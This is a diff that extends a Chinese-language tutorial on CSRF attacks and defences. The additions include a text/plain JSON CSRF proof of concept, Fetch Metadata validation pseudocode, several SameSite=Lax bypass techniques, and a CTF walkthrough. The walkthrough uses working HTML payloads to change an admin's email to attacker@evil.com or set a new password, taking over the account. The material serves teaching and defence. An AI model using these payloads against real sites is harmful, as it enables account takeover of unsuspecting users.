@@ -76,6 +76,47 @@ document.forms[0].submit();
 ### 3. 特定 Content-Type 场景
 很多站点以为“只允许 POST + JSON 就安全”，但如果接口也接受表单、文本、宽松解析或参数覆盖，就仍可能被构造。
 
+### 3.1 JSON CSRF PoC（text/plain 绕过）
+完整可用的 PoC：
+
+```html
+<form action="https://target/api" method="POST" enctype="text/plain">
+  <input name='{"a":"1","b":"' value='c"}'>
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+**为什么必须用 `text/plain`：**
+
+浏览器原生表单只支持三种 `enctype`：
+- `application/x-www-form-urlencoded`（默认）
+- `multipart/form-data`
+- `text/plain`
+
+跨站 `fetch` 想发 `Content-Type: application/json` 属于非简单请求，会先触发 CORS 预检（OPTIONS），攻击者页面过不了预检，请求根本发不出去。因此**跨站能构造的表单 Content-Type 只有上述三种**，只能赌服务端解析宽松。
+
+**text/plain 的拼接原理：**
+
+以 text/plain 提交时，请求体格式为 `name=value`（每字段一行）。上面 PoC 发出的实际 body：
+
+```text
+{"a":"1","b":"=c"}
+```
+
+拆解：
+- name = `{"a":"1","b":"`
+- 分隔符 = `=`
+- value = `c"}`
+
+拼起来正好是一段合法 JSON，`=` 被"藏"进了 JSON 的值里。若服务端直接 `json_decode(file_get_contents('php://input'))`、或框架对 Content-Type 宽松解析，就会当成正常 JSON 处理。
+
+**利用条件：**
+- 服务端不严格校验 `Content-Type` 必须为 `application/json`
+- 接口仅依赖 Cookie 鉴权
+- 需要调整 `=` 落点时，移动 name/value 里的引号即可。例如 name=`{"a":"1","b":"c","d":"`、value=`e"}`，body 变成 `{"a":"1","b":"c","d":"=e"}`
+
+**防御侧：** 服务端必须严格校验 `Content-Type`，并要求自定义头或 CSRF Token。任何一种宽松解析，都会让"JSON 接口天然防 CSRF"的假设失效。
+
 ### 4. 登录 CSRF
 有些业务不是“冒充受害者执行操作”，而是“把受害者悄悄登录进攻击者控制的账号”，从而影响后续操作和数据流向。
 
@@ -175,6 +216,56 @@ document.forms[0].submit();
 - 适合做现代浏览器环境下的“第一层筛选”
 - 仍需为旧浏览器准备 Token 或 `Origin` / `Referer` 兜底策略
 
+### 6.1 Fetch Metadata 校验逻辑与伪代码
+
+`Sec-Fetch-Site` 取值与判定基准：
+
+| 取值 | 含义 | 状态变更请求是否放行 |
+| --- | --- | --- |
+| `same-origin` | 发起站点与目标同源（协议+域名+端口一致） | 放行 |
+| `same-site` | 同站不同源（兄弟子域） | 默认拦截，确有跨子域业务时再放行 |
+| `cross-site` | 跨站发起 | 一律拦截（CSRF 的典型特征） |
+| `none` | 用户直接发起（地址栏、书签） | 仅 `Sec-Fetch-Mode: navigate` 的 GET 导航放行 |
+
+配套读取的头：
+- `Sec-Fetch-Mode`：`navigate`（顶层导航）/ `document`（iframe 加载）/ `cors`（fetch/XHR）
+- `Sec-Fetch-Dest`：`document` / `script` / `image` / `empty`（XHR/fetch）
+- `Sec-Fetch-User`：`?1` 表示由用户手势触发（如地址栏回车）
+
+服务端校验伪代码（Fetch Metadata 资源分离策略的简化实现）：
+
+```python
+def is_csrf_blocked(request):
+    # 只拦截"携带凭据的状态变更请求"
+    if request.method not in ("POST", "PUT", "DELETE", "PATCH"):
+        return False  # 安全方法交给"禁止 GET 改状态"的业务规则
+    if not request.has_credentials:
+        return False  # 未携带凭据，不属于 CSRF 范畴
+
+    site = request.headers.get("Sec-Fetch-Site")
+    mode = request.headers.get("Sec-Fetch-Mode")
+
+    # 头缺失：旧浏览器不支持 Fetch Metadata，交给 Token / Origin 校验兜底
+    if site is None:
+        return False
+
+    # 同源：放行
+    if site == "same-origin":
+        return False
+
+    # 用户从地址栏/书签直接导航：放行
+    if site == "none" and mode == "navigate":
+        return False
+
+    # 其余：same-site / cross-site 的状态变更请求，一律拦截
+    return True
+```
+
+落地要点：
+- 该策略只是"第一层筛选"，必须与 Token、`Origin` 校验共存，为不发送 `Sec-Fetch-*` 的旧浏览器兜底
+- 静态资源类 GET（`Sec-Fetch-Dest: image/script/style`）通常放行，否则会误伤正常加载
+- 建议在网关 / 框架中间件层统一实现，不要散落在各接口里
+
 ### 7. 敏感操作二次确认
 例如：
 - 重新输入密码
@@ -237,6 +328,47 @@ document.forms[0].submit();
 - `SameSite` 主要是防跨站，不防同站子域打同站主域
 - 子域接管、同站 XSS、同站开放重定向都可能削弱它的效果
 
+### 5.1 SameSite=Lax 具体绕过手法
+
+前提回顾：`Lax` 下浏览器只允许"**顶层导航 + 安全方法（GET/HEAD）**"携带 Cookie，其余一律不带（iframe 内表单 POST、fetch/XHR POST、子资源加载）。
+
+#### 手法一：Chrome Lax+POST 两分钟宽限窗口（历史特性）
+Chrome 80 起 Cookie 默认 `SameSite=Lax`，但为兼容支付等流程留了宽限：**Cookie 刚设置不足 2 分钟时，跨站顶层 POST 也会携带**（Lax-allowing-unsafe）。
+
+利用思路：
+1. 先诱导受害者访问目标站任意页面，触发服务端重新下发会话 Cookie（把"Cookie 年龄"刷新到 2 分钟以内）
+2. 立即诱导其打开攻击页，跨站顶层 POST 表单马上提交
+
+现状：后续 Chrome 版本已大幅收紧该窗口（Chrome 80-86 稳定存在，之后缩短并逐步移除），属于历史版本与老环境的实用知识点。
+
+#### 手法二：Cookie 崩溃法（Cookie Jar Overflow）
+浏览器对单域 Cookie 有数量与大小上限（单条约 4KB、每域数百条，因浏览器而异）。思路：
+1. 通过目标的同站子域（任何能写 Cookie 的端点）塞满大量超大 Cookie，把认证 Cookie"挤"出 Cookie 罐
+2. 诱导站点重建会话，若重建时 `Set-Cookie` 忘了带 `SameSite`，认证 Cookie 退化为无 SameSite 状态
+3. 此时跨站 POST 表单重新可携带
+
+该手法依赖目标站的会话重建逻辑，属于"条件苛刻但真实存在"的绕过路径。
+
+#### 手法三：iframe 发 POST 行不通 → GET 化走顶层导航
+`Lax` 下：
+- iframe 中加载攻击页再提交 POST 表单：**Cookie 不带**（非顶层导航）
+- `fetch` / `XMLHttpRequest` 跨站 POST：**Cookie 不带**
+
+因此只剩"顶层导航 + GET"一条路。若服务端方法可切换（POST 改 GET 也接受），用顶层导航发起：
+
+```html
+<script>
+  // window.open 产生顶层导航，GET 请求在 Lax 下会自动携带 Cookie
+  window.open('https://target.com/api/profile/email?email=attacker@evil.com');
+</script>
+```
+
+`<a href>`、`location.href`、`<meta http-equiv="refresh">` 等同样能产生顶层 GET 导航。
+若接口严格只收 POST：转向手法一、手法二，或找同站子域（手法四）。
+
+#### 手法四：同站发起（不受 Lax 限制）
+`SameSite` 判断的是"站点（site）"不是"源（origin）"。攻击者若能控制目标的兄弟子域（子域 XSS、子域接管、可自定义内容的子域服务），从那里发起的请求属于 same-site，`Lax` 与 `Strict` 都拦不住。这是当前实战中最常见的 Lax 绕过面。
+
 ### 6. GET 接口做敏感操作
 一旦敏感操作被设计成 GET，请求可被非常低成本地嵌入：
 - `img`
@@ -281,6 +413,85 @@ document.forms[0].submit();
 - OAuth / SSO / 跳转链是否会刷新 Cookie
 - 是否存在前端路由或脚本 gadget 可发起二次请求
 
+## 案例：CSRF 接管管理员账号（CTF 完整流程）
+
+### 题目背景
+某 CTF 站点：普通用户可注册登录，管理员账号 `admin` 登录后可见 flag。攻击者持有一个普通账号，目标是被"借用"管理员身份完成接管。
+
+### 第一步：发现仅 Cookie 鉴权的敏感接口
+登录后在"个人设置"页抓包，发现修改邮箱接口：
+
+```http
+POST /api/profile/email HTTP/1.1
+Host: target.ctf.com
+Cookie: session=xxxxx
+Content-Type: application/json
+
+{"email":"user1@example.com"}
+```
+
+排查确认：
+- 请求中**没有** CSRF Token
+- 删除 `Referer` / `Origin` 头重放仍返回 200 → 服务端不校验来源
+- 无自定义头要求，接口只认 Cookie
+- 认证 Cookie 为 `SameSite=Lax`
+
+结论：满足 CSRF 成立条件，唯一障碍是 `SameSite=Lax`。
+
+### 第二步：先试标准 POST 表单 PoC（被 Lax 拦截）
+在自己控制的页面构造经典 PoC：
+
+```html
+<form action="https://target.ctf.com/api/profile/email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+通过题目提供的"举报/反馈给管理员"入口提交该页面链接（admin bot 会访问）触发后，接口返回 401——跨站 POST 的 Cookie 被 `Lax` 拦下。
+
+### 第三步：发现方法切换，改走 GET 化
+把请求方法改成 GET 测试：
+
+```http
+GET /api/profile/email?email=attacker@evil.com HTTP/1.1
+Cookie: session=xxxxx
+```
+
+返回 200 且邮箱成功修改——服务端只认参数不看方法，可 GET 化。
+
+### 第四步：构造顶层 GET 导航的最终 PoC
+
+```html
+<!-- victim-poc.html：受害者访问本页即触发 -->
+<script>
+  // window.open 是顶层导航，GET 请求在 SameSite=Lax 下自动携带 Cookie
+  window.open('https://target.ctf.com/api/profile/email?email=attacker@evil.com');
+</script>
+```
+
+### 第五步：借"忘记密码"完成接管
+- 通过举报入口把 PoC 页面链接提交给 admin bot
+- 管理员访问 PoC → 其绑定邮箱被改为 `attacker@evil.com`
+- 在登录页走"忘记密码"，重置链接发到攻击者邮箱 → 重置 `admin` 密码 → 登录拿到 flag
+
+### 备选路径：直接改密
+若存在改密接口 `POST /api/profile/password`（只需 `new_password`，不校验旧密码）且方法同样可切换：
+
+```html
+<script>
+  window.open('https://target.ctf.com/api/profile/password?new_password=P@ssw0rd!');
+</script>
+```
+
+管理员触发后直接改密登录，无需邮箱链路。
+
+### 复盘要点
+- 排查顺序固定：有无 Token → 有无 Origin/Referer 校验 → Cookie 的 SameSite → 方法能否切换
+- `SameSite=Lax` 不是终点：POST 被拦时优先测"GET 化 + 顶层导航（window.open / a 标签）"
+- 接管链路优先选"改邮箱 → 忘记密码"或"直接改密"，两者都只依赖 Cookie 鉴权
+- 若目标严格 POST-only + 严格 Lax，转向同站子域、Lax+POST 宽限窗口、Cookie 崩溃法
+
 ## 防御清单
 - 敏感操作必须使用 CSRF Token
 - Token 必须绑定会话，且不可预测
@@ -302,3 +513,5 @@ document.forms[0].submit();
 - [MDN Set-Cookie / SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie)
 - [PortSwigger Web Security Academy - CSRF](https://portswigger.net/web-security/csrf)
 - [PortSwigger - Bypassing SameSite cookie restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
+- [Google Chrome - SameSite cookies explained](https://developer.chrome.com/blog/samesite/)
+- [web.dev - Prevent unnecessary network requests with Fetch Metadata](https://web.dev/articles/fetch-metadata)
